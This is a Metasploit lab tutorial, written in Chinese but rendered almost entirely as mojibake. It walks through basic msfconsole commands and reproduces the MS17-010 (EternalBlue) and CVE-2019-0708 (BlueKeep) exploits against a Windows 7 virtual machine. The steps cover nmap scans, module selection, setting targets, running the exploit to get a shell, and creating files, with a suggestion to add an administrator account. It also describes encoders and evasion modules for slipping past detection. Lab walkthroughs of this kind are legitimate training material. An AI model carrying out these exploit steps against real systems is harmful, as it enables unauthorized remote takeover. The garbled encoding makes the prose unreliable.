# ä¸€.msf(ç¾å°‘å¦‡)æµ‹è¯•ï¼

## 1.è®²è§£msfåŸºæœ¬å‘½ä»¤

### 1.1é¦–å…ˆæ‰“å¼€kaliç»ˆç«¯æˆæƒï¼Œå¯åŠ¨msf

```
(rootğŸ’€kali)-[~]
â””â”€# msfconsole 
```

![image-20220715200626903](https://i0.hdslb.com/bfs/album/7e1b07cf63383ee8d9bc66daadd8900f5862939b.png)

æ‰“å¼€é¡µé¢ï¼ˆè§‰å¾—ä¸å¥½çœ‹å¯ä»¥è¾“å…¥banneråˆ‡æ¢ç¾ä¸½å›¾æ¡ˆï¼ï¼‰

### 1.2æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼ˆæ³¨æ„æ˜¯åœ¨ç»ˆç«¯æ‰“å¼€ï¼Œä¸æ˜¯è½¯ä»¶é‡Œï¼ä¸æ˜¯è½¯ä»¶é‡Œï¼ä¸æ˜¯è½¯ä»¶é‡Œï¼ï¼‰

```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msfconsole -v   
Framework Version: 6.1.14-dev
```

### 1.3ç®€çº¦æ‰“å¼€

```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msfconsole -q
```

### 1.4é€€å‡ºmsf

```
msf6 > exit
```

![image-20220715201238025](https://i0.hdslb.com/bfs/album/95578b5cdabb2796b4b1b0c357f4e0e202e7c371.png)

## 2.å¤ç°ms17-010(æ°¸æ’ä¹‹è“)æ¼æ´

### 2.1é¦–å…ˆå»ºç«‹win7è™šæ‹Ÿæœº

å› ä¸ºwin7å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ï¼Œæˆ‘ä»¬å…ˆæŠŠkaliå’Œwin7éƒ½é‡‡å–æ¡¥æ¥æ¨¡å¼ï¼Œå½¼æ­¤æ‰èƒ½è”ç³»ï¼Œè·å–win7ipåœ°å€ï¼ˆ192.168.110.201ï¼‰

![image-20220715203721473](https://i0.hdslb.com/bfs/album/27beb4a55f714b759d8c2c5ab8d8527454e061fb.png)

### 2.2å¼€å¯kaliè™šæ‹Ÿæœºæ‰“å¼€ç»ˆç«¯æ‰“å¼€msf

```
msfconsole 
```

![image-20220715202151205](https://i0.hdslb.com/bfs/album/aeef5d4af17a6dd98fcf912ccc9ea644cd286927.png)

### 2.3ä½¿ç”¨nmapè¿›è¡Œç«¯å£æµ‹è¯•ï¼Œçœ‹å®Œæ‹¬å·é‡Œå†è¡ŒåŠ¨ï¼ˆwin7é˜²ç«å¢™ä¸€å®šè¦å…³é—­ï¼Œè¦ä¸ç„¶è¿ä¸ä¸Šï¼ï¼ï¼ï¼‰

![image-20220715203351126](https://i0.hdslb.com/bfs/album/486b3e39bfe7bb1753f8053782f97b121160f2e1.png)

çœ‹å§ï¼Œè¿ä¸ä¸Šï¼

![image-20220715203829188](https://i0.hdslb.com/bfs/album/e09569bd1a76573b98b90277d94505c65d88d420.png)

ä¸Šé¢ç®­å¤´æœ‰downå°±æ˜¯æ²¡æ‰“å¼€ï¼Œä¸‹é¢openå°±æ˜¯æ‰“å¼€äº†ã€‚

### 2.4æ‰“å¼€msf

```
search ms17-010
```

![image-20220715204634733](https://i0.hdslb.com/bfs/album/2a691d954ebab9a8caf2636c5b116d865d89bd46.png)

### 2.5å…ˆå—…æ¢ç›®æ ‡ï¼ˆwin7),æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ç¬¬ä¸‰ä¸ªå»å—…æ¢

```
use 3
```

![image-20220715204904467](https://i0.hdslb.com/bfs/album/a792df2da651ff0a12af0c133ab49a06ae8763f0.png)

### 2.6ä½¿ç”¨optionså¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œyeså¿…å¡«ï¼Œnoä¸ç”¨å¡«å†™ï¼Œè€Œå‘ç°yeså‰é¢ç¼ºå°‘ç›¸å…³ä¿¡æ¯ï¼Œ

```
options
```

![image-20220715205131813](https://i0.hdslb.com/bfs/album/b83e435d5d1648dcfc534b9b8695d7ffa1a76ab3.png)

### 2.7è¡¥å…¨ç›¸å…³ä¿¡æ¯ï¼ˆRHOSTSå¯ä»¥å°å†™ä¸å½±å“ï¼‰

```
set RHOSTS 192.168.110.201
```

![image-20220715205442067](https://i0.hdslb.com/bfs/album/4a3325d21f02446023d3352cbd4efeee8b515cf9.png)

### 2.8å¼€å§‹ä½¿ç”¨exp  (  use  å¤§å†™ä¸è¡Œ)

```
use 0
```

![image-20220715205807821](https://i0.hdslb.com/bfs/album/70848db6895f86e60221fd29ba903910ecd97a93.png)

ç»§ç»­æ‰“å¼€optionsæ£€æŸ¥

![image-20220715205900012](https://i0.hdslb.com/bfs/album/815b3dee85d78cbd2f3c8971a93076c8a971f85b.png)

è€è§„çŸ©ï¼Œæˆ‘ä»¬è¡¥å……ä¸Š

![image-20220715205938738](https://i0.hdslb.com/bfs/album/a90776a87ca01d6bd4fd78d54f812c39dd063c27.png)

### 2.9å¼€å§‹è¿›æ”»ï¼ˆrunï¼‰

```
run
```

![image-20220715210047840](https://i0.hdslb.com/bfs/album/59a209692f53472ea97c8760f98b3277fa9c1b3b.png)

æ˜¾ç¤ºè¿™ä¸ªå°±æ˜¯å¯¹æ–¹æ ¹æ®åœ°ï¼

### 2.10æ‰§è¡Œå‘½ä»¤æµ‹è¯•ï¼

æˆ‘ä»¬è¾“å…¥ç›¸å…³å‘½ä»¤ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹è¿›è¡Œæµ‹è¯•.

![image-20220715210544926](https://i0.hdslb.com/bfs/album/ed8f80668d0e73054c3d340347289f41ce3cf5a3.png)

![image-20220715210627811](https://i0.hdslb.com/bfs/album/c38e7999b5ffa72733b34843ec7fcc31e65473e8.png)

æ‹¿ä¸‹ï¼Œæ‹¿ä¸‹ï¼

### 2.11å¯ä»¥ç”¨exitå‘½ä»¤è¿›è¡Œé€€å‡º

```
exit
```

![image-20220715210814903](https://i0.hdslb.com/bfs/album/1f41f11287da67047b2b2620535b7e4e6fb4b84b.png)

## 3.msfåŸºç¡€çŸ¥è¯†

### 3.1msfå¸¸ç”¨å‘½ä»¤åˆé›†

```
msf6 > use 2                         **search æ‰¾åˆ°æ¨¡å—åï¼Œç”¨ use ä½¿ç”¨æ¨¡å—**
msf6 > search ms17-010            æœç´¢æ¨¡å—ï¼Œ**ä¾‹ï¼šseach ms17-010**
msf6 > banner                       æŸ¥çœ‹å½“å‰msfçš„ç‰ˆæœ¬ä¿¡æ¯å’Œæ¨¡å—æ•°é‡
msf6 > help                      å½“ä½ åˆšè¿›å…¥msfç»ˆç«¯æ—¶ï¼Œä¸çŸ¥é“æœ‰å“ªäº›å‘½ä»¤å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç”¨`help/?`å‘½ä»¤æŸ¥çœ‹msfçš„å‘½ä»¤éƒ½æœ‰å“ªäº›,ä»¥åŠè§£é‡Š
msf6 > ?                           åŠŸèƒ½å’Œhelpä¸€æ ·
sessions                          #sessions â€“h æŸ¥çœ‹å¸®åŠ©
sessions -i <IDå€¼>         #è¿›å…¥ä¼šè¯   -k  æ€æ­»ä¼šè¯
back                               #è¿”å›ä¸Šä¸€æ­¥
run/exploit                     #æ‰§è¡Œå·²æœ‰çš„æ¨¡å—ï¼Œè¾“å…¥runåæŒ‰ä¸¤ä¸‹tabï¼Œåˆ—å‡ºå·²æœ‰çš„è„šæœ¬   -j , åå°è¿è¡Œ
info                                 #æŸ¥çœ‹å·²æœ‰æ¨¡å—ä¿¡æ¯
load                                #åŠ è½½æ’ä»¶
jobs                                #æ˜¾ç¤ºå’Œç®¡ç†ä½œä¸š 
kill                                  # æ€æ­»ä¸€ä¸ªjob  , kill 0
nmap                             # msfæ§åˆ¶å°å†…ç½®çš„æœ‰nmapå·¥å…·
```



### 3.2**æŠ€æœ¯åŠŸèƒ½æ¨¡å—åˆ†ç±»** 

1ã€`Auxiliary`  è´Ÿè´£æ‰§è¡Œä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’Œ Dos æ”»å‡»ç­‰åŠŸèƒ½çš„è¾…åŠ©æ¨¡å— 

2ã€`Exploits`   ä¸»è¦åŒ…å«äº†ä¼ è¯´ä¸­çš„exp , å„ç§æ¼æ´åˆ©ç”¨çš„è„šæœ¬ã€‚ä¸»è¦çš„æ”»å‡»ä»£ç å…¨åœ¨è¿™é‡Œ

â€‹                   åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œï¼Œæ­¤æ¨¡å—å¯¹åº”æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ï¼ˆä¸»åŠ¨ã€è¢«åŠ¨ï¼‰ 

3ã€`Payloads`  è¿™ä¸ªå•è¯ç¿»è¯‘è¿‡æ¥å«è½½è·ï¼šæ˜¯æ”»å‡»è€…å‘é€ç»™ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆä¸åŒ…å«exploitsæ”»å‡»é˜¶æ®µï¼‰ï¼Œ

`payloadsä¸»è¦æ˜¯åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œçš„`ï¼Œè€Œ`exploitsæ˜¯åœ¨æœ¬åœ°æœºæ‰§è¡Œ`ä½œç”¨äºç›®æ ‡æœºã€‚

payload åˆ†ä¸º 3 ç§ç±»å‹ ï¼Œåˆ†åˆ«æ˜¯ singlesã€stages å’Œ stagersã€‚shellcode æ˜¯ç‰¹æ®Šçš„ payloadï¼Œç”¨äºæ‹¿shell

- singlesï¼šall-in-oneã€‚å®Œæ•´çš„ payloadï¼Œè¿™äº› payload éƒ½æ˜¯ä¸€ä½“åŒ–çš„ï¼Œä¸éœ€è¦ä¾èµ–å¤–éƒ¨çš„åº“å’ŒåŒ…ã€‚

- stagersï¼šç›®æ ‡è®¡ç®—æœºå†…å­˜æœ‰é™æ—¶ï¼Œå…ˆä¼ è¾“ä¸€ä¸ªè¾ƒå°çš„ payload ç”¨äºå»ºç«‹è¿æ¥ 

- stagesï¼šåˆ©ç”¨ stagers å»ºç«‹çš„è¿æ¥ä¸‹è½½åç»­ payload

4ã€`Encoders`  å„ç§ç¼–ç å·¥å…· , å¯¹ payload è¿›è¡ŒåŠ å¯† , ç”¨äºèº²è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ

5ã€`Nops`    NOP (No Operation or Next Operation) sled,ç”±äºIDS/IPSä¼šæ£€æŸ¥æ•°æ®åŒ…ä¸­ä¸è§„åˆ™çš„æ•°æ®ï¼Œæ‰€ä»¥åœ¨

æŸäº›åœºåˆä¸‹(æ¯”å¦‚é’ˆå¯¹æº¢å‡ºæ”»å‡»),æŸäº›ç‰¹æ®Šçš„æ»‘è¡Œå­—ç¬¦ä¸²(NOPS x90x90...)åˆ™ä¼šå› ä¸ºè¢«æ‹¦æˆªè€Œå¯¼è‡´æ”»å‡»å¤±æ•ˆï¼Œæ‰€ä»¥æ­¤

æ—¶éœ€è¦ä¿®æ”¹exploitä¸­çš„NOPs.nopsæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿ä¼šåœ¨payloadç”Ÿæˆæ—¶ç”¨åˆ°(åé¢ä¼šæœ‰ä»‹ç»)ã€‚æ¯”å¦‚æˆ‘ä»¬æ‰“å¼€phpçš„

NOPSç”Ÿæˆè„šæœ¬ï¼Œå°±ä¼šå‘ç°å®ƒåªæ˜¯è¿”å›äº†æŒ‡å®šé•¿åº¦çš„ç©ºæ ¼è€Œå·²ã€‚ï¼ˆä¸ç†è§£æ²¡å…³ç³»ï¼‰

6ã€`Post`  è¿™ä¸ªç›®å½•é‡Œæ”¾ç€msf çš„exploitsæ‰§è¡ŒæˆåŠŸåï¼Œ`å‘ç›®æ ‡æœºå‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤`æ¯”å¦‚ï¼š`ææƒ`ï¼Œè·å–hashç­‰ 

7ã€`Evasion` msfä¸­çš„æ··æ·†æ¨¡å— , æ›´æ–°äº†å  è‡ªå¸¦windows denfenderçš„æ··æ·† , æ•ˆæœä¸€èˆ¬ æ—©ä¸å…æ€äº† , æ€»æ¯”æ²¡æœ‰å¥½  è‡ªå·±é…åˆå…¶ä»–æ‰‹æ®µå…æ€

# äºŒ.CVE-2019-0708æ¼æ´å¤ç°

## 1.win7è‚‰é¸¡

é˜²ç«å¢™å…³é—­ , å¼€å¯è¿œç¨‹é“¾æ¥ , å³3389ç«¯å£ï¼Œæ¢æµ‹ç›®æ ‡æ˜¯å¦å¼€å¯å¯¹åº”çš„ç«¯å£ , å³3389

```
nmap -sS -p 3389 192.168.1.110
```

![image-20220716100220928](https://i0.hdslb.com/bfs/album/948ffd16b2b96e254a930ee00ef4da9e6c9ab16e.png)



## 2.ä½¿ç”¨msfå—…æ¢æ¨¡å— , æ¢æµ‹æ˜¯å¦æœ‰æ¼æ´

```
search cve-2019-0708
use 0
show options
```

![image-20220716100640626](https://i0.hdslb.com/bfs/album/425986fc51b355146a13e5837fc64fe85cf6e892.png)

![image-20220716100724388](https://i0.hdslb.com/bfs/album/4907d41325bb9978e1ccfbf0834a24033f95e28f.png)

![image-20220716100839266](https://i0.hdslb.com/bfs/album/e9f95f0b969ef49851007cb29b59f38b11b28f2a.png)

## 3.è®¾ç½®rhosts

```
set rhosts 192.168.1.110     # ç›´æ¥æ¥æ”¶ip , å¦‚æœæƒ³è¦æ‰¹é‡æ£€æµ‹  file:/æ–‡ä»¶è·¯å¾„/æ–‡ä»¶å
run
```

![image-20220716100917934](https://i0.hdslb.com/bfs/album/e693281201176c0e0b86cda2a14e4e2d73ac3278.png)

## 4.è¯´æ˜å­˜åœ¨æ¼æ´ï¼Œæœç´¢cve-2019-0708  é€‰æ‹©ç›¸åº”æ¼æ´åˆ©ç”¨æ¨¡å—

```
search cve-2019-0708
use 1
```

![image-20220716101032795](https://i0.hdslb.com/bfs/album/eaa74b05a5a50f1b0141920751fa8d642790002b.png)

![image-20220716101109450](https://i0.hdslb.com/bfs/album/3f5124a0b062bbed421c096db266af8bb6195bc4.png)



## 5.æ˜¾ç¤ºé€‰é¡¹  æ˜¾ç¤ºtargets

```
show options
show targets
```

![image-20220716101141240](https://i0.hdslb.com/bfs/album/99ec7ac10ce0323126508d7394250feb7e9de881.png)



## 6.è®¾ç½®optionså’Œtargets

```
set rhosts 192.168.1.110
set target 4
```

![image-20220716101521104](https://i0.hdslb.com/bfs/album/71835c8a184e00912fb30e59e4ba2bf80ce8373b.png)



![image-20220716101448519](https://i0.hdslb.com/bfs/album/68db1e9439765f9bfce13e44c6fdfd6177cad69a.png)

## 7.å¼€å§‹æ”»å‡»ï¼Œæ‹¿åˆ°shell

```
run
shell
```

![image-20220716101553970](https://i0.hdslb.com/bfs/album/70203967b3a3d5a4159fd064b115d67760985b7b.png)





## 8.æ‰§è¡Œå‘½ä»¤æµ‹è¯•

```
shell
cd C:\
echo > daociyiyou.txt / æˆ–è€…åˆ›å»ºä¸€ä¸ªç³»ç»Ÿç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„

# é€€å‡º 
exit 
```



## 9.æŸ¥çœ‹win7è‚‰é¸¡